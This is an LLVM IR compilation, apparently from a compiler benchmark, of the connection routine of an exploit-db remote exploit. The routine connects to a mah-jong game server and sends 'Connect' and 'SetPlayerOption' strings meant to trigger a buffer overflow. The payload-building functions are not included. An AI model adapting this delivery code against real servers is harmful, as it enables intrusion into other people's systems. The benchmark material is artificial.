; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23115.c_mj_connect.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23115.c_mj_connect.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"[*] attempting to connect: %s:%d.\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"couldn't resolve hostname.\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c"mah-jong connection failed.\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"[*] successfully connected: %s:%d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [50 x i8] c"[*] sending the strings to exploit the overflow.\0A\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"Connect 1034 0 %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"SetPlayerOption %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local zeroext i16 @mj_connect(i8* %0, i16 zeroext %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 %2, i32* %6, align 4
  %10 = load i32, i32* @AF_INET, align 4
  %11 = load i32, i32* @SOCK_STREAM, align 4
  %12 = load i32, i32* @IPPROTO_TCP, align 4
  %13 = call i32 @socket(i32 %10, i32 %11, i32 %12)
  store i32 %13, i32* %7, align 4
  %14 = load i32, i32* @AF_INET, align 4
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %14, i32* %15, align 4
  %16 = load i16, i16* %5, align 2
  %17 = call i32 @htons(i16 zeroext %16)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %17, i32* %18, align 4
  %19 = load i8*, i8** %4, align 8
  %20 = load i16, i16* %5, align 2
  %21 = zext i16 %20 to i32
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i8* %19, i32 %21)
  %23 = load i8*, i8** %4, align 8
  %24 = call i32 @inet_addr(i8* %23)
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %26 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i32 0, i32 0
  store i32 %24, i32* %26, align 4
  %27 = icmp ne i32 %24, 0
  br i1 %27, label %28, label %42

28:                                               ; preds = %3
  %29 = load i8*, i8** %4, align 8
  %30 = call %struct.hostent* @gethostbyname(i8* %29)
  store %struct.hostent* %30, %struct.hostent** %8, align 8
  %31 = icmp ne %struct.hostent* %30, null
  br i1 %31, label %34, label %32

32:                                               ; preds = %28
  %33 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %34

34:                                               ; preds = %32, %28
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %36 = bitcast %struct.TYPE_2__* %35 to i8*
  %37 = load %struct.hostent*, %struct.hostent** %8, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 0
  %39 = load i64, i64* %38, align 8
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @memcpy(i8* %36, i8* %40, i32 4)
  br label %42

42:                                               ; preds = %34, %3
  %43 = load i32, i32* @SIGALRM, align 4
  %44 = load i32, i32* @sig_alarm, align 4
  %45 = call i32 @signal(i32 %43, i32 %44)
  %46 = load i32, i32* @TIMEOUT, align 4
  %47 = call i32 @alarm(i32 %46)
  %48 = load i32, i32* %7, align 4
  %49 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %50 = call i64 @connect(i32 %48, %struct.sockaddr* %49, i32 12)
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %54

52:                                               ; preds = %42
  %53 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %54

54:                                               ; preds = %52, %42
  %55 = call i32 @alarm(i32 0)
  %56 = load i8*, i8** %4, align 8
  %57 = load i16, i16* %5, align 2
  %58 = zext i16 %57 to i32
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i8* %56, i32 %58)
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.4, i64 0, i64 0))
  %61 = load i32, i32* %7, align 4
  %62 = call i32 (...) @getcode()
  %63 = call i32 @mj_printf(i32 %61, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i32 %62)
  %64 = load i32, i32* %7, align 4
  %65 = load i32, i32* %6, align 4
  %66 = call i32 @getptr(i32 %65)
  %67 = call i32 @mj_printf(i32 %64, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i32 %66)
  %68 = call i32 @sleep(i32 1)
  %69 = load i32, i32* %7, align 4
  %70 = call i32 @close(i32 %69)
  ret i16 0
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @mj_printf(i32, i8*, i32) #1

declare dso_local i32 @getcode(...) #1

declare dso_local i32 @getptr(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
